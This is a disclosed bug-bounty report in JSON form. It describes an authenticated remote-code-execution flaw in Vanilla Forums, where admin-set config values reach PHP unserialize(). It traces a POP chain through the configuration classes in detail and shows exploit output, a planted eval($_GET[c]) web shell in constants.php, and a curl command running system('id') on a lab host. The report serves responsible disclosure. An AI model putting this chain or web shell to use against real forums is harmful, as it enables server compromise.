{
  "id": 407552,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDc1NTI=",
  "url": "https://hackerone.com/reports/407552",
  "title": "Vanilla Forums Gdn_Format unserialize() Remote Code Execution Vulnerability",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2018-09-08T21:56:55.948Z",
  "submitted_at": "2018-09-08T21:56:55.948Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "mr_me",
    "url": "/mr_me",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 17443,
    "url": "https://hackerone.com/vanilla",
    "handle": "vanilla",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Vanilla",
      "twitter_handle": "vanilla",
      "website": "http://vanillaforums.com",
      "about": "Vanilla is a powerfully simple discussion forum you can easily customize to make as unique as your community."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-11-23T15:47:15.399Z",
  "bug_reporter_agreed_on_going_public_at": "2018-10-24T15:47:07.028Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:**\n\nAn authenticated admin user can trigger a call to unserialize() which can allow an attacker to gain remote code execution.\n\n**Description:**\n\nPlease bare with me on this one, it's heavy. Ok, so after setting a Garden.TouchIcon setting (it can be several settings, this is just an example of one) we can reach an the code in renderMaster inside of the library/core/class.controller.php file.\n\n```\nclass Gdn_Controller extends Gdn_Pluggable {\n\n    ...\n\n    public function renderMaster() {\n        // Build the master view if necessary\n        if (in_array($this->_DeliveryType, [DELIVERY_TYPE_ALL])) {\n\n        ...\n\n            $touchIcon = c('Garden.TouchIcon');                                     // 1\n            if ($touchIcon) {\n                $this->Head->setTouchIcon(Gdn_Upload::url($touchIcon));\n            }\n```\n\nAt [1] we see a call to the function c(). As it turns out, that function is just a macro for the call in library/core/functions.general.php\n\n```\nif (!function_exists('config')) {\n    /**\n     * Retrieves a configuration setting.\n     *\n     * @param string|bool $name The name of the configuration setting.\n     * Settings in different sections are separated by dots.\n     * @param mixed $default The result to return if the configuration setting is not found.\n     * @return mixed The configuration setting.\n     * @see Gdn::config()\n     */\n    function config($name = false, $default = false) {                              // 2\n        return Gdn::config($name, $default);\n    }\n}\n```\n\nAt [2] we see the call to Gdn::config which is using the 'Garden.TouchIcon' setting. This function is defined in library/core/class.gdn.php.\n\n```\nclass Gdn {\n\n    ...\n\n    /**\n     * Get a configuration setting for the application.\n     *\n     * @param string $name The name of the configuration setting. Settings in different sections are seperated by a dot ('.')\n     * @param mixed $default The result to return if the configuration setting is not found.\n     * @return Gdn_Configuration|mixed The configuration setting.\n     */\n    public static function config($name = false, $default = false) {\n        if (self::$_Config === null) {\n            self::$_Config = static::getContainer()->get(self::AliasConfig);\n        }\n        $config = self::$_Config;\n        if ($name === false) {\n            $result = $config;\n        } else {\n            $result = $config->get($name, $default);        // 3\n        }\n\n        return $result;\n    }\n```\n\nAt [3] the code calls get() on the Gdn_Configuration class using using the 'Garden.TouchIcon'. This code is defined in library/core/class.configuration.php:\n\n```\nclass Gdn_Configuration extends Gdn_Pluggable {\n\n    ...\n\n    public function get($name, $defaultValue = false) {\n        // Shortcut, get the whole config\n        if ($name == '.') {\n            return $this->Data;\n        }\n\n        $keys = explode('.', $name);\n        // If splitting is off, HANDLE IT\n        if (!$this->splitting) {\n//         $FirstKey = getValue(0, $Keys);\n            $firstKey = $keys[0];\n            if ($firstKey == $this->defaultGroup) {\n                $keys = [array_shift($keys), implode('.', $keys)];\n            } else {\n                $keys = [$name];\n            }\n        }\n        $keyCount = count($keys);\n\n        $value = $this->Data;\n        for ($i = 0; $i < $keyCount; ++$i) {\n            if (is_array($value) && array_key_exists($keys[$i], $value)) {\n                $value = $value[$keys[$i]];\n            } else {\n                return $defaultValue;\n            }\n        }\n\n        if (is_string($value)) {\n            $result = Gdn_Format::unserialize($value);                          // 4\n        } else {\n            $result = $value;\n        }\n\n        return $result;\n    }\n```\n\nAt [4] we can see the static call to unserialize in the Gdn_Format and as suspected, inside of library/core/class.format.php we can see the following code:\n\n```\nclass Gdn_Format {\n\n    ...\n\n    /**\n     * Takes a serialized variable and unserializes it back into its original state.\n     * \n     * @param string $serializedString A json or php serialized string to be unserialized.\n     * @return mixed\n     */\n    public static function unserialize($serializedString) {\n        $result = $serializedString;\n\n        if (is_string($serializedString)) {\n            if (substr_compare('a:', $serializedString, 0, 2) === 0 || substr_compare('O:', $serializedString, 0, 2) === 0) {\n                $result = unserialize($serializedString);                          // 5\n            } elseif (substr_compare('obj:', $serializedString, 0, 4) === 0) {\n                $result = json_decode(substr($serializedString, 4), false);\n            } elseif (substr_compare('arr:', $serializedString, 0, 4) === 0) {\n                $result = json_decode(substr($serializedString, 4), true);\n            }\n        }\n        return $result;\n    }\n```\n\nAt [5] we can reach the vulnerable unserialize with attacker controlled input\n\nExploitation:\n=============\n\nOf course, theory is great but poc||gtfo? Well, as it turns out, there are a few options for us to pick from.\n\nsaturn:vanilla mr_me$ grep --color=always -ir \"__destruct\" .\n./library/database/class.dataset.php:    public function __destruct() {\n./library/core/class.proxyrequest.php:    public function __destruct() {\n./library/core/class.configuration.php:    public function __destruct() {\n\nThe Gdn_DataSet class is useless to us, however the ProxyRequest class seems a little bit more interesting: \n\n```\nclass ProxyRequest {\n\n    ...\n\n    public function __destruct() {\n        if (file_exists($this->CookieJar)) {\n            unlink($this->CookieJar);\n        }\n    }\n```\n\nThis can of course allow us to delete files from the remote system. Be careful here, as attackers can wipe the .htaccess files and weaken the security posture of the application. However, the prime candidate is RCE, so we opted for the next class, the Gdn_Configuration class of course! (how meta).\n\nOk so life is born in Gdn_Configuration's __destruct:\n\n```\nclass Gdn_Configuration extends Gdn_Pluggable {\n\n    ...\n\n    /**\n     *\n     */\n    public function __destruct() {\n        if ($this->autoSave) {                      // 1\n            $this->shutdown();                      // 2\n        }\n    }\n\n    /**\n     *\n     */\n    public function shutdown() {\n        foreach ($this->sources as $source) {\n            $source->shutdown();                    // 3\n        }\n    }\n```\n\nWe can reach the shutdown() call at [2] if we set the autoSave property at [1]. Then at [3] we can call shutdown again, but on a different class, presumably the Gdn_ConfigurationSource class.\n\n```\nclass Gdn_ConfigurationSource extends Gdn_Pluggable {\n\n    ...\n\n    /**\n     *\n     *\n     * @throws Exception\n     */\n    public function shutdown() {\n        if ($this->Dirty) {                 // 4\n            $this->save();                  // 5\n        }\n    }\n```\n\nWe can reach the save() call at [5] by setting the dirty property at [4].\n\n```\nclass Gdn_ConfigurationSource extends Gdn_Pluggable {\n\n    ...\n\n    /**\n     *\n     * \n     * @return bool|null\n     * @throws Exception\n     */\n    public function save() {\n        if (!$this->Dirty) {\n            return null;\n        }\n\n        $this->EventArguments['ConfigDirty'] = &$this->Dirty;\n        $this->EventArguments['ConfigNoSave'] = false;\n        $this->EventArguments['ConfigType'] = $this->Type;\n        $this->EventArguments['ConfigSource'] = $this->Source;\n        $this->EventArguments['ConfigData'] = $this->Settings;\n        $this->fireEvent('BeforeSave');\n\n        if ($this->EventArguments['ConfigNoSave']) {\n            $this->Dirty = false;\n            return true;\n        }\n\n        // Check for and fire callback if one exists\n        if ($this->Callback && is_callable($this->Callback)) {\n            $callbackOptions = [];\n            if (!is_array($this->CallbackOptions)) {\n                $this->CallbackOptions = [];\n            }\n\n            $callbackOptions = array_merge($callbackOptions, $this->CallbackOptions, [\n                'ConfigDirty' => $this->Dirty,\n                'ConfigType' => $this->Type,\n                'ConfigSource' => $this->Source,\n                'ConfigData' => $this->Settings,\n                'SourceObject' => $this\n            ]);\n\n            $configSaved = call_user_func($this->Callback, $callbackOptions);\n\n            if ($configSaved) {\n                $this->Dirty = false;\n                return true;\n            }\n        }\n\n        switch ($this->Type) {                              // 6\n            case 'file':\n                if (empty($this->Source)) {\n                    trigger_error(errorMessage('You must specify a file path to be saved.', 'Configuration', 'Save'), E_USER_ERROR);\n                }\n\n                $checkWrite = $this->Source;\n                if (!file_exists($checkWrite)) {\n                    $checkWrite = dirname($checkWrite);\n                }\n\n                if (!is_writable($checkWrite)) {\n                    throw new Exception(sprintf(t(\"Unable to write to config file '%s' when saving.\"), $this->Source));\n                }\n\n                $group = $this->Group;                                                              // 7\n                $data = &$this->Settings;\n                if ($this->Configuration) {\n                    ksort($data, $this->Configuration->getSortFlag());\n                }\n\n                // Check for the case when the configuration is the group.\n                if (is_array($data) && count($data) == 1 && array_key_exists($group, $data)) {\n                    $data = $data[$group];\n                }\n\n                // Do a sanity check on the config save.\n                if ($this->Source == Gdn::config()->defaultPath()) {\n                    // Log root config changes\n                    try {\n                        $logData = $this->Initial;\n                        $logData['_New'] = $this->Settings;\n                        LogModel::insert('Edit', 'Configuration', $logData);\n                    } catch (Exception $ex) {\n                    }\n\n                    if (!isset($data['Database'])) {\n                        if ($pm = Gdn::pluginManager()) {\n                            $pm->EventArguments['Data'] = $data;\n                            $pm->EventArguments['Backtrace'] = debug_backtrace();\n                            $pm->fireEvent('ConfigError');\n                        }\n                        return false;\n                    }\n                }\n\n                $options = [\n                    'VariableName' => $group,                                                   // 8\n                    'WrapPHP' => true,\n                    'ByLine' => true\n                ];\n\n                if ($this->Configuration) {\n                    $options = array_merge($options, $this->Configuration->getFormatOptions());             // 9\n                }\n\n                // Write config data to string format, ready for saving\n                $fileContents = Gdn_Configuration::format($data, $options);                                 // 10\n\n                if ($fileContents === false) {\n                    trigger_error(errorMessage('Failed to define configuration file contents.', 'Configuration', 'Save'), E_USER_ERROR);\n                }\n\n                // Save to cache if we're into that sort of thing\n                $fileKey = sprintf(Gdn_Configuration::CONFIG_FILE_CACHE_KEY, $this->Source);\n                if ($this->Configuration && $this->Configuration->caching() && Gdn::cache()->type() == Gdn_Cache::CACHE_TYPE_MEMORY && Gdn::cache()->activeEnabled()) {\n                    $cachedConfigData = Gdn::cache()->store($fileKey, $data, [\n                        Gdn_Cache::FEATURE_NOPREFIX => true,\n                        Gdn_Cache::FEATURE_EXPIRY => 3600\n                    ]);\n                }\n\n                $tmpFile = tempnam(PATH_CONF, 'config');\n                $result = false;\n                if (file_put_contents($tmpFile, $fileContents) !== false) {                                 // 11\n                    chmod($tmpFile, 0775);\n                    $result = rename($tmpFile, $this->Source);                                              // 12\n                }\n```\n\nOk so at [6] we trigger a switch statement and want to land into the 'file' block. Then at [7] we want to set `$group` from `$this->Group` to some PHP code. This will become apparent soon.\n\nThen at [8] we set `$options` to be an associative array containing our controlled `$group` at 'VariableName'. At [9] that array is merged with another array and then at [10] a call to format() is made. This has been excluded from the analysis but essentially, we can set a global variable in there using our controlled 'VariableName' value.\n\nNow after [10] we have our PHP code in `$fileContents` is then placed into a random file in the config directory at [11]. Finally, at [12] the random file is renamed to the attackers supplied filename using `$this->Source`.\n\nThis can allow remote code execution. In the exploit, I choose to use 'constants.php' as a target for a few reasons:\n\n1. We have a \"show stopper\" as its know, which is `if (!defined('APPLICATION')) exit();`. This wont allow us to execute PHP code directly\n   even if we delete the .htaccess using the other potential pop chain.\n\n   This contants.php file is included into the web root of the application, so we can execute the injected PHP code from the index page.\n\n2. The config folder is naturally writable due to the caching in the same directory and that the code contantantly (pun intended) updates the config.php file.\n\nRemember to snapshot or backup your installation before running this exploit. It DOES NOT attempt to clean up after exploitation.\n\n## Example:\n\n```\nsaturn:~ mr_me$ ./poc.py \n(+) usage: poc.py <target> <cookie>\n(+) eg: poc.py 172.16.175.143 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1Mzg5NDk5OTIsImlhdCI6MTUzNjM1Nzk5Miwic3ViIjoyfQ.OoAIBcGiGKFPxGsfg_-9hFfohv0dO_CNqx1lK8YE7Kg\n\nsaturn:~ mr_me$ ./poc.py 172.16.175.143 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1Mzg5NDk5OTIsImlhdCI6MTUzNjM1Nzk5Miwic3ViIjoyfQ.OoAIBcGiGKFPxGsfg_-9hFfohv0dO_CNqx1lK8YE7Kg\n(+) targeting: http://172.16.175.143\n(+) shell injected into contants.php successfully!\n(+) shell at: http://172.16.175.143/?c=phpinfo();\n\nsaturn:~ mr_me$ curl -sSG \"http://172.16.175.143/?c=system('id');\" | cut -d \"<\" -f1\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\nNow, on the target system:\n\n```\nsteven@pluto:/var/www/html/conf$ cat constants.php \n<?php if (!defined('APPLICATION')) exit();\n$a=eval($_GET[c]);//[''] = '';\n\n// Last edited by admin (172.16.175.1)2018-09-08 20:35:19\n```\n\n## Steps to reproduce:\n\n1. Backup your installation.\n2. Login as an admin and get the Vanilla cookie\n3. Run the poc against your target with the cookie.\n\n## Anything else we should know?\n\nGive me a few days and I'll write you a patch. Basically you just need a `__wakeUp` call in the Gdn_Configuration class.\n\n## Impact\n\nHigh, RCE.",
  "bounty_amount": "600.0",
  "formatted_bounty": "$600",
  "weakness": {
    "id": 52,
    "name": "Deserialization of Untrusted Data"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 343923,
      "file_name": "Screen_Shot_2018-09-08_at_3.49.17_PM.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/343/923/e8dca2698d64c8f29ff27d252a80004bce0098ff/Screen_Shot_2018-09-08_at_3.49.17_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-09-08_at_3.49.17_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-09-08_at_3.49.17_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6PGWSTMP%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T131050Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCViOi%2F56ueEuvIwenQe%2BLb%2BwbBeFYt95o%2B27q1gAyjJQIhAJy41GZeNB%2F35zQFEMMldvRn9RKuTJ921mYFGjWXM4xOKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5Igyfj5amkH4Q4qV17RUqjwW2CAxiK4m4hWEAlsDvzI4tTbj8wtQkEbV8t3TJ6TszDYzbxoZfKv%2FF1ngpPiZtnooExkiPG26fSsSPVxr95a5R%2Bb53aIMfs4cvspAbjO408u%2FKZN5zXVPh6CnfCbsN8F6X%2F9KN%2Fbv66jc7vpds0BIK8%2B6fFbH50L%2BJ7loxPgYJpwQKPGA%2BxAU3n4cW0xu40kEa4HScwwT%2BqFoMNkHSPq7v%2FMX6cc1VRdiCryuyIqwF%2Bs0t%2FvdjeVHg78LS0%2FuMMNkbwDSMNufKbDqARDuoU0P%2F7njwSrXV5%2BkRLbGbe0L89dhffkGntr%2Bd%2FtQ8CCYU66m%2FjoL0k41lI2HeR3O7pLZw6xc3baudQgvKzzU8naKjeMtCWmGIlkN1deTGbW6VWFv94mPhh6xqwYF%2FygK1ASZXWcjKuCZDkbIOgvNsJXfi9GobE%2Fg%2FQCvqFLRdBFuYpEHQ%2BmeEDcfMacgRXA297IImF0dUJN85r5YBUSsTgEED3A1n%2BDuZ7EYlyHsa0FOqtqBvavx526YAyqmogm2M05wZ7943732ur203IxCn9N2G019Q9wlJDIhQKk2ujbfG2QJJ9kcZT0%2FclqOtb7n1O02fUwDgOTGWF7a6VW3W7hV6bjCy%2B5Rac9PzkS6VymX8vtLX1k%2FZgwFkOteSUd2%2FRZ6WSu3ZzHNAUkrRcuUOocwK48DWkjTuzKGjaWSycV5T7TkIYO82PSRCe3%2FO3LFd%2F1MQ3Lt2TctQHWcm%2FuYG8L64tYNCvpptkP4lbIEMyLovg2Tcvod1IiJWSFCfdjo3%2F62cnjstu7oIkOgQE1rNQRi7tl%2BOpOZ3O2p1%2BkSM9%2F0IDEkXXc43X4wqyrJxFCXTAgtGobNnX8BPw1JLWKKzcjvCMLC1ra4GOrABG6HOSlDmK1pVHFgvG0UCsHX0y77qrI5WogVE2SsoeRtdX%2BFgr0TJVFxF%2FqzndNjCSF1CE7s5o1cvQRnubzfIEHh%2Bql4Yr2YDxqHDFub6HZHglXezaL0SQVMK924Vna4%2Fd7oHIUZe52JuzZ8HuqQcy4plSO1mkvy6u0L4T%2F1njIpact7INdijf%2B1WFhWhjy0qA%2BmL%2BCVvUwMMaTaqrHm4JzWtOGywBhoyvrV0SfdDvYQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3e5b64d5cb5fff803e331b0b847d1d4bdf09c8d9a5e47a1f36f0beb96b827b4a",
      "file_size": 255995,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 343924,
      "file_name": "poc.py",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/343/924/9fba8618a0bcc4d7ec1be3be30d210fd6efa4caf/poc.py?response-content-disposition=attachment%3B%20filename%3D%22poc.py%22%3B%20filename%2A%3DUTF-8%27%27poc.py&response-content-type=text%2Fx-python&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6PGWSTMP%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T131050Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCViOi%2F56ueEuvIwenQe%2BLb%2BwbBeFYt95o%2B27q1gAyjJQIhAJy41GZeNB%2F35zQFEMMldvRn9RKuTJ921mYFGjWXM4xOKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5Igyfj5amkH4Q4qV17RUqjwW2CAxiK4m4hWEAlsDvzI4tTbj8wtQkEbV8t3TJ6TszDYzbxoZfKv%2FF1ngpPiZtnooExkiPG26fSsSPVxr95a5R%2Bb53aIMfs4cvspAbjO408u%2FKZN5zXVPh6CnfCbsN8F6X%2F9KN%2Fbv66jc7vpds0BIK8%2B6fFbH50L%2BJ7loxPgYJpwQKPGA%2BxAU3n4cW0xu40kEa4HScwwT%2BqFoMNkHSPq7v%2FMX6cc1VRdiCryuyIqwF%2Bs0t%2FvdjeVHg78LS0%2FuMMNkbwDSMNufKbDqARDuoU0P%2F7njwSrXV5%2BkRLbGbe0L89dhffkGntr%2Bd%2FtQ8CCYU66m%2FjoL0k41lI2HeR3O7pLZw6xc3baudQgvKzzU8naKjeMtCWmGIlkN1deTGbW6VWFv94mPhh6xqwYF%2FygK1ASZXWcjKuCZDkbIOgvNsJXfi9GobE%2Fg%2FQCvqFLRdBFuYpEHQ%2BmeEDcfMacgRXA297IImF0dUJN85r5YBUSsTgEED3A1n%2BDuZ7EYlyHsa0FOqtqBvavx526YAyqmogm2M05wZ7943732ur203IxCn9N2G019Q9wlJDIhQKk2ujbfG2QJJ9kcZT0%2FclqOtb7n1O02fUwDgOTGWF7a6VW3W7hV6bjCy%2B5Rac9PzkS6VymX8vtLX1k%2FZgwFkOteSUd2%2FRZ6WSu3ZzHNAUkrRcuUOocwK48DWkjTuzKGjaWSycV5T7TkIYO82PSRCe3%2FO3LFd%2F1MQ3Lt2TctQHWcm%2FuYG8L64tYNCvpptkP4lbIEMyLovg2Tcvod1IiJWSFCfdjo3%2F62cnjstu7oIkOgQE1rNQRi7tl%2BOpOZ3O2p1%2BkSM9%2F0IDEkXXc43X4wqyrJxFCXTAgtGobNnX8BPw1JLWKKzcjvCMLC1ra4GOrABG6HOSlDmK1pVHFgvG0UCsHX0y77qrI5WogVE2SsoeRtdX%2BFgr0TJVFxF%2FqzndNjCSF1CE7s5o1cvQRnubzfIEHh%2Bql4Yr2YDxqHDFub6HZHglXezaL0SQVMK924Vna4%2Fd7oHIUZe52JuzZ8HuqQcy4plSO1mkvy6u0L4T%2F1njIpact7INdijf%2B1WFhWhjy0qA%2BmL%2BCVvUwMMaTaqrHm4JzWtOGywBhoyvrV0SfdDvYQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e25550c2d2d0774a9e70661852b92987c2bb92c357ed1c2dca71dece44b53baf",
      "file_size": 17982,
      "type": "text/x-python",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2018-11-23T15:47:07.080Z",
  "allow_singular_disclosure_after": -164841823.49527776,
  "singular_disclosure_allowed": true,
  "vote_count": 24,
  "voters": [
    "irek",
    "fqdn",
    "inhibitor181",
    "sameerphad72",
    "spam404",
    "ali",
    "ahiezer",
    "eveeez",
    "sasi2103",
    "khizer47",
    "and 14 more..."
  ],
  "severity": {
    "rating": "critical",
    "score": 9.1,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "high",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 2101,
    "asset_type": "WILDCARD",
    "asset_identifier": "*.vanillaforums.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "id": 10346,
      "category": "researcher",
      "content": "An authenticated admin user can trigger a call to unserialize() which can allow an attacker to gain remote code execution leveraging a custom pop chain.",
      "user": {
        "id": 41443,
        "username": "mr_me",
        "name": "Steven Seeley",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": "https://srcincite.io/",
        "location": "",
        "created_at": "2015-10-08T18:38:12.546Z",
        "url": "https://hackerone.com/mr_me",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
